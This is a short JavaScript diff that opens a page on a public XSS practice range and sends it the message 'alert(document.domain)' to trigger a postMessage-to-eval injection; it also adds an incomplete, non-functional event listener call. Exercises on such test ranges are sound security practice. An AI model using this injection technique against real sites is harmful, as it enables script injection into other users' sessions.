@@ -6,6 +6,10 @@
 
 const target = window.open("https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval" ,"_blank","popup");
 
-Window.postMessage(
+target.postMessage(
 "alert(document.domain)" , "https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval"
 );
+
+window.addEventListener(
+    "message",
+)
